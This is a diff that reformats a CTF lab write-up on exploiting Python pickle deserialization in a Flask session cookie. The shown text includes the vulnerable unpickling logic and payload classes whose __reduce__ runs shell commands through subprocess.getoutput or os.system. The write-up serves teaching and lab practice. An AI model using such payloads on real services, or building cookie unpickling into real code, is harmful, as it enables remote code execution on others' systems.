@@ -9,15 +9,14 @@ date: 2023-02-05
 # Simple Web 0x16(Lab - Pickle)
 <!-- more -->
 ###### tags: `NTUSTWS` `CTF` `Web`
-Challenge: http://h4ck3r.quest:8600/
-Note: open a brand new window that haven't login `http://h4ck3r.quest`
+* Challenge: http://h4ck3r.quest:8600/
+* Note: open a brand new window that haven't login `http://h4ck3r.quest`
 
 ## Background
 [0x15.5(Pickle)](/IcoQql7UQiegLv8KtK2wOw)
 
 ## Source code
-:::spoiler code
-```pyton=
+```python
 from flask import Flask, request, make_response, redirect, send_file
 import base64
 import pickle
@@ -54,23 +53,24 @@ def login():
     resp.set_cookie("session", user)
     return resp
 ```
-:::
 
 ### Description & Analyze
 In main function, it'll request session and parse it by `base64` then deserialize it.
+
 If session is none, you can enter your name and age then it'll serialize the data and transfer by base64.
+
 For example: name=123, age=123
+
 The Cookie: session=`gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg==`
-```python!
+```python
 >>> pickle.loads(base64.b64decode('gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg=='))
 {'name': '123', 'age': 123}
 ```
 
 ## Exploit
-1. Construct exploit function
-Note that the format must be `{'name': '', 'age': ''}`
+1. Construct exploit function: Note that the format must be `{'name': '', 'age': ''}`
 2. Payload
-    ```python!
+    ```python
     class exploit(object):
         def __reduce__(self):
             return (__import__('subprocess').getoutput, ('ls',))
@@ -85,7 +85,7 @@ Note that the format must be `{'name': '', 'age': ''}`
 
     So that if we use `os.system` as payload directly the output will not be render correctly.
     * For instance:
-        ```python!
+        ```python
         class exploit(object):
         def __reduce__(self):
             return (os.system, ('ls',))
@@ -109,7 +109,7 @@ Note that the format must be `{'name': '', 'age': ''}`
     So, you can use `subprocess.getoutput` to fetch the outcome without exit code
     ![](https://i.imgur.com/T8kvBel.png)
 3. Whole exploit
-    ```python=
+    ```python
     import pickle
     import os
     import pickletools
